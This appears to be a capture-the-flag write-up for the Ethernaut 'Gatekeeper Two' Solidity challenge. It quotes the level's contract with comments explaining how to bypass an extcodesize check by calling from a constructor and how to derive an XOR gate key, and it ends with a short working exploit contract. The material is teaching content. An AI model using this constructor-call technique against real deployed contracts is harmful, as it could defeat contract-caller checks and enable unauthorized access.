### 14 - Gatekeeper Two

#### Author Note:
This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.
Things that might help:

    Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
    The assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See Solidity Assembly for more information. The extcodesize call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the yellow paper.
    The ^ character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see Solidity cheatsheet). The Coin Flip level is also a good place to start when approaching this challenge.

```Solidity
contract GatekeeperTwo {
	address public entrant;

	// 1. compute from another contract
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

	// 2. extcodesize returns the contracts code size. 
	// to bypass this check we can call this function during construction, as the extcodesize is not stored yet.
	// `extcodesize(address(this)) == 0` within constructor() function
	// https://medium.com/coinmonks/bypass-solidity-contract-size-check-c6e93396b722
    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
			// x ^ gatekey = y
			// gatekey = x ^ y
			// gatekey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
			uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
		);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

- [exploit](script/14_GatekeeperTwoSolve.s.sol)
```
contract Mallicious {
	constructor(address _target) {
		bytes8 gateKey = bytes8( uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max );
		GatekeeperTwo(_target).enter(gateKey);
	}
}
```
